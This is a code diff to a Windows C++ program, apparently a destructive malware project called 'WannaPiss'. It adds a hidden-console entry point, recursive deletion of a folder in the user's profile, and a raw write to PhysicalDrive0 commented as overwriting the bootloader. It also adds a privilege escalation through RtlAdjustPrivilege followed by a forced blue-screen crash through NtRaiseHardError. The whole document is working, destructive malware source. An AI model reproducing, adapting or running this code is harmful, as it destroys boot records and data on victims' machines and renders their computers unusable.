@@ -1,5 +1,7 @@
 #include <iostream>
 #include <Windows.h>
+#include <cstdlib>
+#include <filesystem>
 //#include "data.hpp"
 
 const unsigned char code1[] = {
@@ -201,7 +203,18 @@ const size_t code1_len = sizeof(code1);
 const size_t code2_len = sizeof(code2);
 
 
-int main() {
+int WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
+	// Delete everyting in ~/WannaPiss
+	const char* homeDirectory = getenv("USERPROFILE");
+	char wpPath[256];
+	strcpy(wpPath, homeDirectory);
+	strcat(wpPath, "\\WannaPiss\\");
+
+	std::filesystem::remove_all(wpPath); // Deletes one or more files recursively.
+
+
+
+	// Overwrie bootloader
 	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
 
 	if (drive == INVALID_HANDLE_VALUE)
@@ -221,4 +234,37 @@ int main() {
 		ExitProcess(3);
 
 	CloseHandle(drive);
+
+	// Cause BSOD
+	// Load the library in order to adjust privileges 
+	const LPVOID RTLAdjustPrivilegeLibAddress = GetProcAddress(LoadLibrary(L"ntdll.dll"), "RtlAdjustPrivilege");
+
+	// Load the module in order to create the BSoD 
+	const LPVOID NtRaiseHardErrorModuleAddress = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
+
+	// Function cast for RtlAdjustPrivilege 
+	using pdef_RTLAdjustPrivilege = NTSTATUS(NTAPI*)(ULONG privilege, BOOLEAN enable, BOOLEAN currentThread,
+		PBOOLEAN enabled);
+
+	// Create the function to modify program's rights - typecast the typedef earlier to adjustPrivilegeLibAddress 
+	const auto RtlAdjustPrivilege = static_cast<pdef_RTLAdjustPrivilege>(RTLAdjustPrivilegeLibAddress);
+
+	// Function cast for NtRaiseHardError 
+	using pdef_NTRaiseHardError = NTSTATUS(NTAPI*)(NTSTATUS errorStatus, ULONG numberOfParameters,
+		ULONG unicodeStringParameterMask OPTIONAL, PULONG_PTR parameters,
+		ULONG responseOption, PULONG response);
+
+	// Create the function to crash the computer - typecast the typedef earlier to errorModuleAddress 
+	const auto NtRaiseHardError = static_cast<pdef_NTRaiseHardError>(NtRaiseHardErrorModuleAddress);
+
+	// Adjust privileges to debug mode so the program can have permission to edit kernel memory; see line 10343 of winnt.h for list of privileges 
+	BOOLEAN previousValue;
+	RtlAdjustPrivilege(19, TRUE, FALSE, &previousValue);
+
+	// Call to crash the computer
+	ULONG response;
+	NtRaiseHardError(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &response);
+
+	// Should take about 5 seconds to crash. Return an error if computer does not crash.
+	return -1;
 }
